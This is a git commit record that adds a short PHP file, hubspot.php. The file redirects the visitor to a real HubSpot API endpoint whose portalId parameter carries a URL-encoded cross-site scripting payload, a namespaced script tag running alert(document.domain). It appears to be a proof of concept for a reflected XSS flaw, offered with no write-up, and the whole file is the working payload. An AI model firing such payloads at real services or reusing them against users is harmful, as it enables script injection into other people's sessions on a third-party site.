16796426951d14ab4b92ba68768eb8cef81c14fb
missoum1307 <missoum1307@users.noreply.github.com>
2018-01-20 20:32:03 +0100

    Create hubspot.php

---
+++ hubspot.php
@@ -0,0 +1,7 @@
+
+<?php 
+header("Location: https://app.hubspot.com/content/api/v4/tools-menu/has-permission?portalId=q%3C?PXML%3E%3Chtml:script%3Ealert(document.domain)%3C/html:script%3E
+
+")
+
+*/?>
